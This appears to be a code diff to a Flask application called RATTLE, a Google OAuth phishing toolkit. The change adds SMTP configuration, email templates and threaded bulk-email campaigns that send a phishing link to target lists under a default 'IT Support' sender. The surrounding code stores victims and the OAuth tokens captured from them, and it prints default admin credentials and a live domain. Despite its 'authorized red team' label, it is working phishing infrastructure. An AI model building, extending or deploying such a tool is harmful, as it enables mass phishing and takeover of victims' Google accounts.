@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # ============================================
 # RATTLE - Google OAuth Phishing Toolkit
-# Version: 1.0
+# Version: 1.2 - Added SMTP & Email Campaigns
 # For authorized red team use only
 # ============================================
 
@@ -11,6 +11,12 @@ import secrets
 import datetime
 import hashlib
 import re
+import smtplib
+import ssl
+import threading
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
@@ -42,7 +48,6 @@ migrate = Migrate(app, db)
 
 @app.template_filter('json_loads')
 def json_loads_filter(data):
-    """Safely parse JSON string for use in templates"""
     if not data:
         return {}
     try:
@@ -55,7 +60,6 @@ def json_loads_filter(data):
 # ============================================
 
 class User(db.Model):
-    """Admin user for the panel"""
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String(80), unique=True, nullable=False)
     password_hash = db.Column(db.String(200), nullable=False)
@@ -69,7 +73,6 @@ class User(db.Model):
         return check_password_hash(self.password_hash, password)
 
 class Campaign(db.Model):
-    """Phishing campaign"""
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String(100), nullable=False)
     description = db.Column(db.Text)
@@ -85,6 +88,7 @@ class Campaign(db.Model):
     
     victims = db.relationship('Victim', backref='campaign', lazy=True)
     tokens = db.relationship('Token', backref='campaign', lazy=True)
+    email_campaigns = db.relationship('EmailCampaign', backref='campaign', lazy=True)
     
     def generate_phishing_url(self):
         auth_url = (
@@ -100,7 +104,6 @@ class Campaign(db.Model):
         return auth_url
 
 class Victim(db.Model):
-    """Victim information"""
     id = db.Column(db.Integer, primary_key=True)
     campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
     email = db.Column(db.String(200))
@@ -114,7 +117,6 @@ class Victim(db.Model):
     tokens = db.relationship('Token', backref='victim', lazy=True)
 
 class Token(db.Model):
-    """Captured OAuth tokens"""
     id = db.Column(db.Integer, primary_key=True)
     campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
     victim_id = db.Column(db.Integer, db.ForeignKey('victim.id'), nullable=False)
@@ -150,6 +152,77 @@ class Token(db.Model):
             'is_active': self.is_active,
             'user_info': user_data
         }
+
+# ============================================
+# NEW: SMTP Configuration Model
+# ============================================
+
+class SmtpConfig(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(100), default='Default')
+    host = db.Column(db.String(200), nullable=False)
+    port = db.Column(db.Integer, default=587)
+    use_tls = db.Column(db.Boolean, default=True)
+    use_ssl = db.Column(db.Boolean, default=False)
+    username = db.Column(db.String(200))
+    password = db.Column(db.String(200))
+    from_email = db.Column(db.String(200), nullable=False)
+    from_name = db.Column(db.String(100), default='IT Support')
+    is_active = db.Column(db.Boolean, default=True)
+    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
+
+# ============================================
+# NEW: Email Template Model
+# ============================================
+
+class EmailTemplate(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(100), nullable=False)
+    subject = db.Column(db.String(300), nullable=False)
+    body_html = db.Column(db.Text, nullable=False)
+    body_text = db.Column(db.Text)
+    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
+
+# ============================================
+# NEW: Email Campaign Model
+# ============================================
+
+class EmailCampaign(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(200), nullable=False)
+    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
+    template_id = db.Column(db.Integer, db.ForeignKey('email_template.id'))
+    smtp_id = db.Column(db.Integer, db.ForeignKey('smtp_config.id'))
+    status = db.Column(db.String(20), default='draft')
+    total_targets = db.Column(db.Integer, default=0)
+    sent_count = db.Column(db.Integer, default=0)
+    failed_count = db.Column(db.Integer, default=0)
+    opened_count = db.Column(db.Integer, default=0)
+    clicked_count = db.Column(db.Integer, default=0)
+    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
+    started_at = db.Column(db.DateTime)
+    completed_at = db.Column(db.DateTime)
+    
+    template = db.relationship('EmailTemplate')
+    smtp = db.relationship('SmtpConfig')
+    targets = db.relationship('EmailTarget', backref='email_campaign', lazy=True, cascade='all, delete-orphan')
+
+# ============================================
+# NEW: Email Target Model
+# ============================================
+
+class EmailTarget(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    email_campaign_id = db.Column(db.Integer, db.ForeignKey('email_campaign.id'), nullable=False)
+    email = db.Column(db.String(300), nullable=False)
+    name = db.Column(db.String(200))
+    status = db.Column(db.String(20), default='pending')
+    sent_at = db.Column(db.DateTime)
+    opened_at = db.Column(db.DateTime)
+    clicked_at = db.Column(db.DateTime)
+    error_message = db.Column(db.Text)
+    tracking_id = db.Column(db.String(64), unique=True)
+    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
 
 # ============================================
 # Create Default Admin User
@@ -358,6 +431,246 @@ def refresh_token(token_id):
         return jsonify({'error': 'Refresh failed'}), 400
 
 # ============================================
+# NEW: SMTP Routes
+# ============================================
+
+@app.route('/smtp')
+def smtp_list():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    configs = SmtpConfig.query.all()
+    return render_template('smtp_list.html', configs=configs)
+
+@app.route('/smtp/create', methods=['GET', 'POST'])
+def smtp_create():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    if request.method == 'POST':
+        config = SmtpConfig(
+            name=request.form.get('name', 'Default'),
+            host=request.form.get('host'),
+            port=int(request.form.get('port', 587)),
+            use_tls=request.form.get('use_tls') == 'on',
+            use_ssl=request.form.get('use_ssl') == 'on',
+            username=request.form.get('username'),
+            password=request.form.get('password'),
+            from_email=request.form.get('from_email'),
+            from_name=request.form.get('from_name', 'IT Support'),
+            is_active=True
+        )
+        db.session.add(config)
+        db.session.commit()
+        return redirect(url_for('smtp_list'))
+    
+    return render_template('smtp_form.html')
+
+@app.route('/smtp/<int:config_id>/test', methods=['POST'])
+def smtp_test(config_id):
+    config = SmtpConfig.query.get_or_404(config_id)
+    
+    try:
+        msg = MIMEMultipart('alternative')
+        msg['Subject'] = 'Rattle SMTP Test'
+        msg['From'] = formataddr((config.from_name, config.from_email))
+        msg['To'] = config.from_email
+        msg.attach(MIMEText('<h1>SMTP Test Successful!</h1><p>Your SMTP configuration is working.</p>', 'html'))
+        
+        if config.use_ssl:
+            context = ssl.create_default_context()
+            server = smtplib.SMTP_SSL(config.host, config.port, context=context)
+        else:
+            server = smtplib.SMTP(config.host, config.port)
+            if config.use_tls:
+                server.starttls()
+        
+        if config.username and config.password:
+            server.login(config.username, config.password)
+        
+        server.send_message(msg)
+        server.quit()
+        return jsonify({'success': True, 'message': 'Test email sent!'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/smtp/<int:config_id>/delete', methods=['POST'])
+def smtp_delete(config_id):
+    config = SmtpConfig.query.get_or_404(config_id)
+    db.session.delete(config)
+    db.session.commit()
+    return jsonify({'success': True})
+
+# ============================================
+# NEW: Email Template Routes
+# ============================================
+
+@app.route('/templates')
+def template_list():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    templates = EmailTemplate.query.all()
+    return render_template('template_list.html', templates=templates)
+
+@app.route('/template/create', methods=['GET', 'POST'])
+def template_create():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    if request.method == 'POST':
+        template = EmailTemplate(
+            name=request.form.get('name'),
+            subject=request.form.get('subject'),
+            body_html=request.form.get('body_html'),
+            body_text=request.form.get('body_text')
+        )
+        db.session.add(template)
+        db.session.commit()
+        return redirect(url_for('template_list'))
+    
+    return render_template('template_form.html')
+
+# ============================================
+# NEW: Email Campaign Routes
+# ============================================
+
+@app.route('/email-campaigns')
+def email_campaigns():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    campaigns = EmailCampaign.query.order_by(EmailCampaign.created_at.desc()).all()
+    return render_template('email_campaigns.html', campaigns=campaigns)
+
+@app.route('/email-campaign/create', methods=['GET', 'POST'])
+def email_campaign_create():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    if request.method == 'POST':
+        campaign = EmailCampaign(
+            name=request.form.get('name'),
+            campaign_id=request.form.get('campaign_id'),
+            template_id=request.form.get('template_id') or None,
+            smtp_id=request.form.get('smtp_id') or None,
+            status='draft'
+        )
+        db.session.add(campaign)
+        db.session.commit()
+        
+        targets_text = request.form.get('targets', '')
+        for line in targets_text.split('\n'):
+            line = line.strip()
+            if line:
+                parts = line.split(',')
+                email = parts[0].strip()
+                name = parts[1].strip() if len(parts) > 1 else None
+                target = EmailTarget(
+                    email_campaign_id=campaign.id,
+                    email=email,
+                    name=name,
+                    status='pending'
+                )
+                db.session.add(target)
+        
+        db.session.commit()
+        campaign.total_targets = len(campaign.targets)
+        db.session.commit()
+        return redirect(url_for('email_campaign_detail', campaign_id=campaign.id))
+    
+    campaigns = Campaign.query.filter_by(status='active').all()
+    templates = EmailTemplate.query.all()
+    smtps = SmtpConfig.query.filter_by(is_active=True).all()
+    
+    return render_template('email_campaign_form.html',
+        campaigns=campaigns,
+        templates=templates,
+        smtps=smtps
+    )
+
+@app.route('/email-campaign/<int:campaign_id>')
+def email_campaign_detail(campaign_id):
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    campaign = EmailCampaign.query.get_or_404(campaign_id)
+    return render_template('email_campaign_detail.html', campaign=campaign)
+
+@app.route('/email-campaign/<int:campaign_id>/send', methods=['POST'])
+def email_campaign_send(campaign_id):
+    if 'user_id' not in session:
+        return jsonify({'error': 'Unauthorized'}), 401
+    
+    campaign = EmailCampaign.query.get_or_404(campaign_id)
+    
+    if campaign.status == 'sending':
+        return jsonify({'error': 'Campaign is already sending'}), 400
+    
+    smtp_config = campaign.smtp or SmtpConfig.query.filter_by(is_active=True).first()
+    if not smtp_config:
+        return jsonify({'error': 'No SMTP configuration found'}), 400
+    
+    template = campaign.template
+    if not template:
+        return jsonify({'error': 'No email template found'}), 400
+    
+    phishing_url = campaign.campaign.phishing_url
+    
+    campaign.status = 'sending'
+    campaign.started_at = datetime.datetime.utcnow()
+    db.session.commit()
+    
+    def send_emails():
+        with app.app_context():
+            targets = EmailTarget.query.filter_by(
+                email_campaign_id=campaign.id,
+                status='pending'
+            ).all()
+            
+            for target in targets:
+                try:
+                    msg = MIMEMultipart('alternative')
+                    msg['Subject'] = template.subject
+                    msg['From'] = formataddr((smtp_config.from_name, smtp_config.from_email))
+                    msg['To'] = formataddr((target.name or target.email, target.email))
+                    
+                    body_html = template.body_html.replace('{{name}}', target.name or 'User')
+                    body_html = body_html.replace('{{email}}', target.email)
+                    body_html = body_html.replace('{{link}}', phishing_url)
+                    
+                    msg.attach(MIMEText(body_html, 'html'))
+                    
+                    if smtp_config.use_ssl:
+                        context = ssl.create_default_context()
+                        server = smtplib.SMTP_SSL(smtp_config.host, smtp_config.port, context=context)
+                    else:
+                        server = smtplib.SMTP(smtp_config.host, smtp_config.port)
+                        if smtp_config.use_tls:
+                            server.starttls()
+                    
+                    if smtp_config.username and smtp_config.password:
+                        server.login(smtp_config.username, smtp_config.password)
+                    
+                    server.send_message(msg)
+                    server.quit()
+                    
+                    target.status = 'sent'
+                    target.sent_at = datetime.datetime.utcnow()
+                    campaign.sent_count += 1
+                except Exception as e:
+                    target.status = 'failed'
+                    target.error_message = str(e)
+                    campaign.failed_count += 1
+                
+                db.session.commit()
+            
+            campaign.status = 'completed'
+            campaign.completed_at = datetime.datetime.utcnow()
+            db.session.commit()
+    
+    thread = threading.Thread(target=send_emails)
+    thread.start()
+    
+    return jsonify({'success': True, 'message': 'Campaign started'})
+
+# ============================================
 # Settings Route
 # ============================================
 
@@ -474,7 +787,6 @@ def oauth_callback():
     print(f"[+] Email: {user_info.get('email', 'Unknown')}")
     print(f"[+] Campaign: {campaign.name}")
     print(f"[+] Token ID: {token.id}")
-    print(f"[+] Access Token: {token.access_token[:50]}...")
     
     return """
     <html>
@@ -519,7 +831,9 @@ if __name__ == '__main__':
     print("\n✅ Running at: https://wiskon.shop")
     print("🔑 Default login: rattle / rattle123")
     print("\n📊 Dashboard: /dashboard")
-    print("📧 Create campaigns: /campaign/create")
+    print("📧 Email Campaigns: /email-campaigns")
+    print("📧 SMTP Settings: /smtp")
+    print("📧 Templates: /templates")
     print("🔑 View tokens: /tokens")
     print("=" * 60)
     print("\n🚀 For production, use:")
